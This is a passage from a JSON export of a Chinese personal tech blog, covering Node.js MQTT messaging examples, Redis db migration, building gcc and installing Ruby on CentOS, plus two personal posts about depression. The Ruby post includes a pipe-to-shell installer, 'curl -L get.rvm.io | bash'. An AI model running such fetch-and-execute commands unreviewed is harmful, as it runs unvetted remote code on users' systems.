mqtt.connect(<span style=\"color: #66cccc;\">'mqtt:\/\/127.0.0.1:1883'<\/span>);\nclient.on(<span style=\"color: #66cccc;\">'connect'<\/span>, <span style=\"color: #99cc99;\">function<\/span> () {\n<span style=\"background-color: #515151;\"> <\/span>   client.publish(<span style=\"color: #66cccc;\">'sub'<\/span>, <span style=\"color: #66cccc;\">'message from pub'<\/span>);\n}).on(<span style=\"color: #66cccc;\">'message'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">topic<\/span>, <span style=\"color: #ffcc66;\">message<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   console.log(topic + <span style=\"color: #66cccc;\">': '<\/span> + message.toString());\n<span style=\"background-color: #515151;\"> <\/span>   client.end();\n});\n<\/pre>\n<\/div>\n\n<p>\n\u8fd0\u884c <code>server.js<\/code>\n<\/p>\n<pre class=\"example\">\n$ node server.js\nmosca server running\nclient(mqttjs_ebdc9fd4) connected\nclient(internal) published topic($SYS\/4Jk9PBwDe\/new\/clients): mqttjs_ebdc9fd4\nclient(mqttjs_ebdc9fd4) subscribed topic(sub)\nclient(internal) published topic($SYS\/4Jk9PBwDe\/new\/subscribes): {\"clientId\":\"mqttjs_ebdc9fd4\",\"topic\":\"sub\"}\nclient(mqttjs_ff000868) connected\nclient(internal) published topic($SYS\/4Jk9PBwDe\/new\/clients): mqttjs_ff000868\nclient(mqttjs_ff000868) published topic(sub): message from pub\nclient(mqttjs_ebdc9fd4) unsubscribed topic(sub)\nclient(mqttjs_ebdc9fd4) disconnected\nclient(internal) published topic($SYS\/4Jk9PBwDe\/new\/unsubscribes): {\"clientId\":\"mqttjs_ebdc9fd4\",\"topic\":\"sub\"}\nclient(internal) published topic($SYS\/4Jk9PBwDe\/disconnect\/clients): mqttjs_ebdc9fd4\n<\/pre>\n\n<p>\n\u8fd0\u884c <code>client_sub.js<\/code>\n<\/p>\n<pre class=\"example\">\n$ node client_sub.js\nsub: message from pub\n$\n<\/pre>\n\n<p>\n\u8fd0\u884c <code>client_pub.js<\/code>\n<\/p>\n<pre class=\"example\">\n$ node client_pub.js\n<\/pre>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u5ba2\u6237\u7aef\u4e0e\u5ba2\u6237\u7aef\u79bb\u7ebf\u901a\u4fe1<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u79bb\u7ebf\u901a\u4fe1\u9700\u8981\u540c\u65f6\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u670d\u52a1\u5668\u914d\u7f6e\u6301\u4e45\u5b58\u50a8\n<\/li>\n\n<li>\u8ba2\u9605\u65b9\u542f\u7528\u4f1a\u8bdd\u72b6\u6001\n\n<p>\n\u8fde\u63a5\u670d\u52a1\u5668\u65f6\u4f7f\u7528\u540c\u6837\u7684 clientId \u5e76\u6307\u5b9a <code>clean<\/code> \u4e3a <code>false<\/code>\n<\/p>\n<\/li>\n\n<li>\u53d1\u5e03\u65b9\u53d1\u5e03\u6301\u4e45\u6d88\u606f\n\n<p>\n\u53d1\u5e03\u6d88\u606f\u65f6\u6307\u5b9a <code>qos<\/code> \u5927\u4e8e <code>0<\/code> \u4ee5\u53ca <code>retain<\/code> \u4e3a <code>true<\/code>\n<\/p>\n<\/li>\n<\/ul>\n\n<p>\n\u4e0b\u9762\u7684\u4f8b\u5b50\u6f14\u793a\u4e86\u5ba2\u6237\u7aef\u63a5\u6536\u79bb\u7ebf\u6d88\u606f\n<\/p>\n\n<p>\n<code>client_sub.js<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">mqtt<\/span> = require(<span style=\"color: #66cccc;\">'mqtt'<\/span>);\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">client<\/span> = mqtt.connect(<span style=\"color: #66cccc;\">'mqtt:\/\/127.0.0.1:1883'<\/span>, {clientId: <span style=\"color: #66cccc;\">'sub'<\/span>, clean: <span style=\"color: #6699cc;\">fals<\/span><span style=\"color: #6699cc; text-decoration: underline;\">e<\/span><span style=\"text-decoration: underline;\">});<\/span>\nclient.on(<span style=\"color: #66cccc;\">'connect'<\/span>, <span style=\"color: #99cc99;\">function<\/span> () {\n<span style=\"background-color: #515151;\"> <\/span>   client.subscribe(<span style=\"color: #66cccc;\">'sub'<\/span>);\n}).on(<span style=\"color: #66cccc;\">'message'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">topic<\/span>, <span style=\"color: #ffcc66;\">message<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   console.log(topic + <span style=\"color: #66cccc;\">': '<\/span> + message.toString());\n<span style=\"background-color: #515151;\"> <\/span>   client.end();\n});\n<\/pre>\n<\/div>\n\n<p>\n<code>client_pub.js<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">mqtt<\/span> = require(<span style=\"color: #66cccc;\">'mqtt'<\/span>);\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">client<\/span> = mqtt.connect(<span style=\"color: #66cccc;\">'mqtt:\/\/127.0.0.1:1883'<\/span>, {clientId: <span style=\"color: #66cccc;\">'pub'<\/span>});\nclient.on(<span style=\"color: #66cccc;\">'connect'<\/span>, <span style=\"color: #99cc99;\">function<\/span> () {\n<span style=\"background-color: #515151;\"> <\/span>   client.publish(<span style=\"color: #66cccc;\">'sub'<\/span>, <span style=\"color: #66cccc;\">'message from pub'<\/span>, {qos: 1, retain: <span style=\"color: #6699cc;\">true<\/span>});\n}).on(<span style=\"color: #66cccc;\">'message'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">topic<\/span>, <span style=\"color: #ffcc66;\">message<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   console.log(topic + <span style=\"color: #66cccc;\">': '<\/span> + message.toString());\n<span style=\"background-color: #515151;\"> <\/span>   client.end();\n});\n<\/pre>\n<\/div>\n\n<p>\n\u8fd0\u884c <code>srever.js<\/code>\n<\/p>\n<pre class=\"example\">\n$ node mqtt_server.js\nmosca server running\nclient(sub) connected\nclient(internal) published topic($SYS\/V19OSVfix\/new\/clients): sub\nclient(sub) subscribed topic(sub)\nclient(internal) published topic($SYS\/V19OSVfix\/new\/subscribes): {\"clientId\":\"sub\",\"topic\":\"sub\"}\nclient(sub) disconnected\nclient(internal) published topic($SYS\/V19OSVfix\/disconnect\/clients): sub\nclient(pub) connected\nclient(internal) published topic($SYS\/V19OSVfix\/new\/clients): pub\nclient(pub) published topic(sub): message from pub\nclient(sub) connected\nclient(internal) published topic($SYS\/V19OSVfix\/new\/clients): sub\nclient(sub) subscribed topic(sub)\nclient(internal) published topic($SYS\/V19OSVfix\/new\/subscribes): {\"clientId\":\"sub\",\"topic\":\"sub\"}\nclient(sub) disconnected\nclient(internal) published topic($SYS\/V19OSVfix\/disconnect\/clients): sub\n<\/pre>\n\n<p>\n\u8fd0\u884c <code>client_sub.js<\/code> \u8ba2\u9605\u6d88\u606f\u540e\u9000\u51fa\n<\/p>\n<pre class=\"example\">\n$ node client_sub.js \nsub: message from pub\n$\n<\/pre>\n\n<p>\n\u8fd0\u884c <code>client_pub.js<\/code> \u53d1\u5e03\u6d88\u606f\n<\/p>\n<pre class=\"example\">\n$ node mqtt_client_pub.js\n<\/pre>\n\n<p>\n\u8fd0\u884c <code>client_sub.js<\/code> \u63a5\u6536\u79bb\u7ebf\u6d88\u606f\u540e\u9000\u51fa\n<\/p>\n<pre class=\"example\">\n$ node client_sub.js \nsub: message from pub\n$\n<\/pre>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n<a href=\"http:\/\/docs.oasis-open.org\/mqtt\/mqtt\/v3.1.1\/os\/mqtt-v3.1.1-os.html\">MQTT Version 3.1.1<\/a>\n<\/p>\n\n<p>\n<a href=\"https:\/\/www.youtube.com\/watch?v=WE7GVIFRV7Q\">Matteo Collina: \"MQTT\" and \"Node.js\"- Messaging the Internet of Things <\/a>\n<\/p>\n\n<p>\n<a href=\"http:\/\/thejackalofjavascript.com\/getting-started-mqtt\/\">Getting started with MQTT | The Jackal of Javascript<\/a><\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u6211\u5e94\u8be5\u662f\u4e2d\u5ea6\u6291\u90c1\u75c7",
  "timestamp": "2016-01-07 16:44:00",
  "tags": [
    "\u5fc3\u7406"
  ],
  "body": "<p>\n\u4e00\u76f4\u6000\u7591\u81ea\u5df2\u6709\u6291\u90c1\u75c7\uff0c\u4eca\u5929\u770b\u4e86\u4e00\u4e0b\u300a\u8d70\u51fa\u6291\u90c1\u7684\u9634\u5f71\uff1a\u4f2f\u6069\u65af\u65b0\u60c5\u7eea\u7597\u6cd5\u300b\uff0c\u6839\u636e\u91cc\u9762\u63d0\u53ca\u7684\u201c\u8d1d\u514b\u6291\u90c1\u6e05\u5355\u201d\u8fdb\u884c\u4e86\u81ea\u6d4b\uff0c\u7ed3\u679c\u4e3a <code>24\u5206 \u4e2d\u5ea6\u6291\u90c1<\/code> \u3002\n<\/p>\n\n<p>\n\u4ee5\u524d\u542c\u5230\u7535\u89c6\u91cc\u63d0\u5230\u7edd\u5927\u90e8\u5206\u4eba\u90fd\u6709\u5fc3\u7406\u75be\u75c5\uff0c\u6211\u603b\u662f\u505a\u5fc3\u91cc\u70b9\u5934\u9ed8\u9ed8\u98d8\u8fc7\u72b6\uff0c\u60f3\u4e0d\u5230\u81ea\u5df2\u4e5f\u4f1a\u4e2d\u62db\u3002\n<\/p>\n\n<p>\n\u4eba\u6216\u8bb8\u5c31\u50cf\u662f\u7a0b\u5e8f\uff0c\u4e0a\u5e1d\u5199\u51fa\u6765\u7684\u65f6\u5019\u662f\u5b8c\u7f8e\u7684\uff0c\u53ea\u662f\u6210\u957f\u8fc7\u7a0b\u4e2d\u63ba\u5165\u4e86\u6742\u8d28\uff0c\u51fa\u73b0\u4e86 <code>BUG<\/code> \uff0c\u6211\u8981\u5f00\u59cb <code>DEBUG<\/code> \u4e86\u3002<\/p>\n"
},
{
  "title": "\u6211\u7684\u6291\u90c1\u75c7\u7684\u8fd0\u884c\u8fc7\u7a0b",
  "timestamp": "2016-01-09 18:11:00",
  "tags": [
    "\u5fc3\u7406"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u53d1\u75c5\u6d41\u7a0b<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>\u4ece\u5fc3\u91cc\u5192\u51fa\u7684\u626d\u66f2\u5ff5\u5934\n\n<p>\n\u6709\u65f6\u5019\u662f\u65e0\u610f\u4e2d\u770b\u5230\u67d0\u4e2a\u4eba\u5f15\u8d77\uff0c\u6709\u65f6\u5019\u662f\u8d70\u795e\u4e00\u4f1a\u513f\u540e\u7a81\u7136\u4ece\u5934\u8111\u4e2d\u5192\u51fa\u3002\n<\/p>\n<\/li>\n\n<li>\u89c9\u5f97\u96be\u53d7\u3001\u63ea\u5fc3\u3001\u5c48\u8fb1\n\n<p>\n\u5934\u8111\u6709\u51b2\u8840\u5835\u585e\u7684\u611f\u89c9\uff0c\u5f88\u96be\u653e\u677e\u4e0b\u6765\u8fdb\u884c\u7406\u6027\u5206\u6790\u3002\n<\/p>\n<\/li>\n\n<li>\u6ca1\u6709\u5fc3\u60c5\u505a\u4e8b\u60c5\n\n<p>\n\u60c5\u611f\u900f\u652f\u5f15\u8d77\u5fc3\u529b\u6194\u60b4\uff0c\u5fc3\u70e6\u610f\u4e71\u6ca1\u6cd5\u505a\u6210\u4e8b\u60c5\u3002\u4ece\u9053\u5fb7\u4e0a\u89c9\u5f97\u81ea\u5df2\u4e0d\u5e94\u8be5\u662f\u8fd9\u79cd\u72b6\u6001\uff0c\u53c8\u89c9\u5f97\u81ea\u5df2\u518d\u52aa\u529b\u53bb\u505a\uff0c\n\u4e5f\u53ef\u80fd\u88ab\u4eba\u62d6\u540e\u817f\uff0c\u81ea\u5df2\u7684\u6210\u679c\u4e0d\u4f1a\u88ab\u8ba4\u53ef\uff0c\u6ca1\u6709\u4e2a\u4eba\u4ef7\u503c\u3002\u4e8b\u540e\u89c9\u5f97\u5f88\u5185\u759a\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u4e60\u60ef\u7684\u529b\u91cf<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u4e4b\u524d\u6709\u770b\u8fc7\u300a\u4e60\u60ef\u7684\u529b\u91cf\u300b\uff0c\u6211\u89c9\u5f97\u6291\u90c1\u75c7\u5c31\u662f\u4e00\u79cd\u5fc3\u7406\u7684\u574f\u4e60\u60ef\uff0c\u5c31\u7b97\u4f60\u53d1\u73b0\u4e86\u5b83\uff0c\u4e86\u89e3\u4e86\u5b83\uff0c\u514b\u670d\u5b83\u7edd\u975e\u4e00\u671d\u4e00\u5915\uff0c\u56e0\u4e3a\u5b83\u662f\u81ea\u53d1\u8fd0\u884c\u7684\uff0c\u5728\u4f60\u610f\u8bc6\u5230\u5b83\u4e4b\u524d\u5b83\u53ef\u80fd\u5df2\u7ecf\u8fd0\u884c\u4e86\u5f88\u4e45\uff0c\u5bf9\u4f60\u7684\u8eab\u5fc3\u9020\u6210\u4e86\u5f88\u5927\u7684\u7834\u574f\u3002\u5b83\u5c31\u50cf\u662f\u8682\u87e5\uff0c\u5b83\u521a\u5f00\u59cb\u53ee\u4e0a\u4f60\u7684\u65f6\u5019\uff0c\u4f1a\u7a0d\u5fae\u75db\u4e00\u4e0b\uff0c\u7b49\u5230\u5b83\u91ca\u653e\u51fa\u9ebb\u9189\u6548\u679c\uff0c\u4f60\u5c31\u518d\u4e5f\u611f\u89c9\u4e0d\u5230\u5b83\u5728\u5438\u4f60\u7684\u8840\uff0c\u751a\u81f3\u5728\u5f80\u4f60\u8eab\u4f53\u91cc\u94bb\u3002\u6291\u90c1\u75c7\u4e5f\u4f1a\u9ebb\u9189\u4f60\u7684\u611f\u77e5\uff0c\u8ba9\u4f60\u9ed8\u9ed8\u957f\u4e45\u627f\u53d7\u5fc3\u7075\u7684\u75db\u82e6\uff0c\u4f60\u4e60\u60ef\u4e86\u8fd9\u79cd\u75db\u82e6\uff0c\u4f60\u53c8\u6709\u6297\u62d2\u6539\u53d8\u7684\u672c\u80fd\u3002\u5c31\u50cf\u662f\u8fd9\u4e2a\u4e16\u754c\u4e0a\u96be\u4ee5\u6212\u9664\u7684\u5404\u79cd\u763e\u4e00\u6837\uff0c\u6291\u90c1\u75c7\u4e5f\u662f\u4eba\u751f\u4e2d\u8981\u8fc8\u8fc7\u7684\u4e00\u9053\u574e\u3002<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u8fc1\u79fbredis\u5e93\u7684\u67d0\u4e2adb",
  "timestamp": "2016-01-21 18:00:00",
  "tags": [
    "redis"
  ],
  "body": "<p>\n\u5728\u9879\u76ee\u5f00\u59cb\u7684\u65f6\u5019\uff0c\u5f80\u5f80\u4f1a\u628a\u5404\u79cd\u7528\u9014\u7684\u6570\u636e\u653e\u5230\u4e00\u4e2a redis \u5b9e\u4f8b\u4e2d\uff0c\u5982 db1 \u5b58\u653e\u529f\u80fd A \u7684\u6570\u636e\u3001db2 \u5b58\u653e\u529f\u80fd B \u7684\u6570\u636e\u3002\n<\/p>\n\n<p>\n\u5f53 redis \u7684\u538b\u529b\u4e0a\u6765\u4e86\u4e4b\u540e\uff0c\u5f80\u5f80\u9700\u8981\u5c06\u67d0\u4e2a db \u8fc1\u79fb\u5230\u5176\u5b83\u7684\u5b9e\u4f8b\u4e0a\uff0c\u5982\u679c\u662f\u6574\u4e2a\u5b9e\u4f8b\u8fdb\u884c\u8fc1\u79fb\uff0c\u901a\u5e38\u4f1a\u901a\u8fc7 Master-Slave \u5c06\u6570\u636e\u540c\u6b65\u5230\u65b0\u673a\u5668\uff0c\u7136\u540e\u63d0\u5347\u65b0\u673a\u5668\u4e0a\u7684 redis \u4e3a Master\u3002\n<\/p>\n\n<p>\n\u4f46\u662f\u9047\u5230\u53ea\u9700\u8981\u8fc1\u79fb 1 \u4e2a db \u7684\u6570\u636e\u5230\u65b0\u7684 redis \u5b9e\u4f8b\uff08\u8be5\u5b9e\u4f8b\u5df2\u6709\u5176\u5b83\u6570\u636e\uff09\u7684\u60c5\u51b5\uff0c\u5c31\u9700\u8981\u501f\u52a9 redis \u6570\u636e\u8fc1\u79fb\u5de5\u5177\u4e86\uff0c\u8fd9\u91cc\u4ecb\u7ecd\u4e24\u4e2a\u5de5\u5177\u3002\n<\/p>\n\n<p>\n\u5047\u8bbe\u8981\u5c06 redis \u7684 db5 \u4ece 192.168.1.100 \u4e0a\u7684 redis \u8fc1\u5230 192.168.1.101 \u4e0a\u7684 db5\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\"><a href=\"https:\/\/github.com\/salimane\/redis-tools\">redis-copy.py<\/a><\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u4f7f\u7528 python \u5f00\u53d1\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5b89\u88c5\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo pip2 install redis\nwget https:\/\/github.com\/salimane\/redis-tools\/raw\/master\/redis-copy.py\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5f00\u59cb\u8fc1\u79fb\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">python2 .\/redis-copy.py --source=192.168.1.100:6379 --target=192.168.1.101:6379 <span style=\"text-decoration: underline;\">--databases=5 --limit=1000000000<\/span>\npython2 .\/redis-copy.py --source=192.168.1.100:6379 --target=192.168.1.101:6379 <span style=\"text-decoration: underline;\">--databases=5 --clean<\/span>\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\"><a href=\"https:\/\/github.com\/yaauie\/redis-copy\">redis-copy<\/a> \uff08\u63a8\u8350\uff09<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u4f7f\u7528 ruby \u5f00\u53d1\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5b89\u88c5\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">gem install redis-copy\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5f00\u59cb\u8fc1\u79fb\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">~\/.gem\/ruby\/2.3.0\/bin\/redis-copy 192.168.1.100:6379\/5 192.168.1.101:6379\/5\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u6bd4\u8f83<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<a href=\"https:\/\/github.com\/salimane\/redis-tools\">redis-copy.py<\/a> \u5728\u8fc1\u79fb\u8fc7\u7a0b\u4e2d db \u53f7\u4e0d\u80fd\u6539\u53d8\uff0c\u9700\u8981\u5728\u6e90 db \u4e2d\u4e34\u65f6\u5199\u5165\u5927\u91cf\u7c3f\u8bb0\u4fe1\u606f\uff0c\u6700\u7ec8\u4e5f\u6ca1\u6709\u5b8c\u5168\u6e05\u7c3f\u8bb0\u4fe1\u606f\uff08mig:run \u952e\uff09\u3002\n\u9ed8\u8ba4\u4e00\u6b21\u8fd0\u884c\u8fc1\u79fb 10000 \u6761\u8bb0\u5f55\uff0c\u53ef\u4ee5\u591a\u6b21\u8fd0\u884c\u8fc1\u79fb\u540e\u9762\u7684\u6570\u636e\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a &#x2013;limit \u4e3a\u4e00\u4e2a\u591f\u5927\u7684\u6570\u91cf\u4e00\u6b21\u6027\u8fc1\u79fb\u3002\n\u652f\u6301\u540c\u65f6\u8fc1\u79fb\u591a\u4e2a db \u3002\n<\/p>\n\n<p>\n<a href=\"https:\/\/github.com\/yaauie\/redis-copy\">redis-copy<\/a> \u53ef\u4ee5\u4efb\u610f\u6307\u5b9a\u6e90\u3001\u76ee\u7684 db \u53f7\uff0c\u4e0d\u9700\u8981\u5f80 redis \u5199\u5165\u7c3f\u8bb0\u4fe1\u606f\u3002<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "CentOS 6.4 \u4e0a\u7f16\u8bd1\u5b89\u88c5 gcc 5.2.0",
  "timestamp": "2016-01-22 21:12:00",
  "tags": [
    "linux"
  ],
  "body": "<p>\nnode.js 4.x \u7684\u7b2c\u4e09\u65b9\u6269\u5c55\u7f16\u8bd1\u65f6\u8981\u6c42 gcc \u7248\u672c\u4e3a 4.8\uff0c\u4f46\u662f CentOS 6.4 \u4ed3\u5e93\u91cc\u7684\u7248\u672c\u4e3a 4.4.7\uff0c\n\u5728\u751f\u4ea7\u73af\u5883\u4ece\u7b2c\u4e09\u65b9\u4ed3\u5e93\u91cc\u5b89\u88c5\u6700\u65b0\u7248 gcc \u53c8\u4e0d\u653e\u5fc3\uff0c\u8fd8\u662f\u81ea\u5df2\u4ece\u6e90\u4ee3\u7801\u7f16\u8bd1\u5b89\u88c5\u5427\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u4e0b\u8f7d gcc \u6e90\u4ee3\u7801\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">wget http:\/\/mirror.lzu.edu.cn\/gnu\/gcc\/gcc-5.2.0\/gcc-5.2.0.tar.bz2\ntar xjvf gcc-5.2.0.tar.bz2\n<span style=\"color: #cc99cc;\">cd<\/span> gcc-5.2.0\n<\/pre>\n<\/div>\n\n<p>\n\u5b98\u65b9\u7684\u4e0b\u8f7d\u5730\u5740\u4e3a <a href=\"ftp:\/\/ftp.gnu.org\/gnu\/gcc\/\">ftp:\/\/ftp.gnu.org\/gnu\/gcc\/<\/a> \uff0c\u4f7f\u7528\u56fd\u5185\u955c\u50cf <a href=\"http:\/\/mirror.lzu.edu.cn\/gnu\/gcc\">http:\/\/mirror.lzu.edu.cn\/gnu\/gcc<\/a> \u5feb\u5f88\u591a\u3002\n<\/p>\n<\/li>\n\n<li>\u5b89\u88c5\u4f9d\u8d56\u7684\u5305\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yum install gmp-devel\nyum install mpfr-devel\nyum install libmpc-devel\n<\/pre>\n<\/div>\n\n<p>\n\u53c2\u8003\u81ea INSTALL \u76ee\u5f55\u4e0b\u7684\u6587\u6863\u3002\n<\/p>\n<\/li>\n\n<li>\u7f16\u8bd1\u5b89\u88c5\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">.\/configure --prefix=\/opt\/gcc-5.2.0 --disable-multilib\nmake\nmake -k check\nmake install\n<\/pre>\n<\/div>\n\n<p>\n<code>--disable-multilib<\/code> \u53ea\u7f16\u8bd1 64 \u4f4d\u3002\n<\/p>\n\n<p>\n\u7f16\u8bd1\u65f6\u95f4\u4f1a\u8017\u65f6\u51e0\u4e2a\u5c0f\u65f6\uff0c\u8fd9\u6bb5\u65f6\u95f4\u6700\u597d\u53bb\u5e72\u70b9\u522b\u7684\u3002\n<\/p>\n<\/li>\n\n<li>\u5207\u6362gcc\u7248\u672c\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">PATH<\/span>=\/opt\/gcc-5.2.0\/bin:$<span style=\"color: #ffcc66;\">PATH<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u6216\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">CC<\/span>=\/opt\/gcc-5.2.0\/bin\/gcc\n<span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">CPP<\/span>=\/opt\/gcc-5.2.0\/bin\/cpp\n<span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">CXX<\/span>=\/opt\/gcc-5.2.0\/bin\/c++\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u53c2\u8003\n\n<p>\n<a href=\"http:\/\/superuser.com\/questions\/381160\/how-to-install-gcc-4-7-x-4-8-x-on-centos\">yum - How to Install gcc 4.7.x\/4.8.x on CentOS - Super User<\/a>\n<\/p>\n\n<p>\n<a href=\"https:\/\/wiki.mikejung.biz\/Gcc_CentOS\">Gcc CentOS - How to compile gcc-4.8.2 on CentOS 6.6<\/a><\/p>\n<\/li>\n<\/ul>\n"
},
{
  "title": "CentOS 6.4 \u4e0a\u5b89\u88c5 ruby 1.9.3",
  "timestamp": "2016-01-22 21:12:00",
  "tags": [
    "linux",
    "ruby"
  ],
  "body": "<p>\nCentOS 6.4 \u4e0a\u4ed3\u5e93\u4e2d\u7684 Ruby \u7248\u672c\u4e3a 1.8.7 \u592a\u65e7\u4e86\uff0c<a href=\"https:\/\/github.com\/yaauie\/redis-copy\">redis-copy<\/a> \u8981\u6c42 Ruby \u7248\u672c\u81f3\u5c11\u4e3a 1.9.3\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5b89\u88c5 rvm\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">curl -L get.rvm.io | bash -s stable\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5b89\u88c5 Ruby 1.9.3\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">\/usr\/local\/rvm\/bin\/rvm install 1.9.3\n<\/pre>\n<\/div>\n\n<ul class=\"org-ul\">\n<li>\u542f\u7528 Ruby 1.9.3\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">source \/usr\/local\/rvm\/scripts\/rvm\nrvm use 1.9.3\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5b89\u88c5 RubyGems\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">rvm rubygems current\n<\/pre>\n<\/div>\n<\/li>\n\n<li>RubyGems \u5b98\u65b9\u6e90\u56fd\u5185\u8bbf\u95ee\u4e0d\u7a33\u5b9a\uff0c\u6362\u6210\u6dd8\u5b9d\u7684\u955c\u50cf\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">gem sources --remove https:\/\/rubygems.org\/\ngem sources -a https:\/\/ruby.taobao.org\/\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5b89\u88c5 <a href=\"https:\/\/github.com\/yaauie\/redis-copy\">redis-copy<\/a>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">gem install redis-copy\n<\/pre>\n<\/div>\n\n<p>\n\u5b89\u88c5\u540e\u7a0b\u5e8f\u8def\u5f84\u4e3a \/usr\/local\/rvm\/gems\/ruby-1.9.3-p551\/bin\/redis-copy\n<\/p>\n\n<p>\n\u542f\u7528 Ruby 1.9.3 \u540e\uff0credis-copy \u53ef\u4ee5\u76f4\u63a5\u8fd0\u884c\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/li>\n\n<li>\u53c2\u8003\n\n<p>\n<a href=\"https:\/\/www.digitalocean.com\/community\/tutorials\/how-to-install-ruby-on-rails-on-centos-6-with-rvm\">How To Install Ruby on Rails on CentOS 6 with RVM | DigitalOcean<\/a>\n<\/p>\n\n<p>\n<a href=\"https:\/\/ruby-china.org\/topics\/3705\">\u624b\u628a\u624b\u5b89\u88c5RVM\u4ee5\u53ca\u4e3a\u4ec0\u4e48RVM is not a function \u00bb Topics \u00bb Ruby China<\/a>\n<\/p>\n\n<p>\n<a href=\"http:\/\/www.jb51.net\/article\/49079.htm\">\u6dd8\u5b9d\u7f51\u63d0\u4f9b\u7684\u56fd\u5185RubyGems\u955c\u50cf\u7b80\u4ecb\u548c\u4f7f\u7528\u65b9\u6cd5_ruby\u4e13\u9898_\u811a\u672c\u4e4b\u5bb6<\/a><\/p>\n<\/li>\n<\/ul>\n"
},
{
  "title": "pm2\u7684\u65e5\u5fd7\u7ba1\u7406",
  "timestamp": "2016-02-17 14:16:00",
  "tags": [
    "node"
  ],
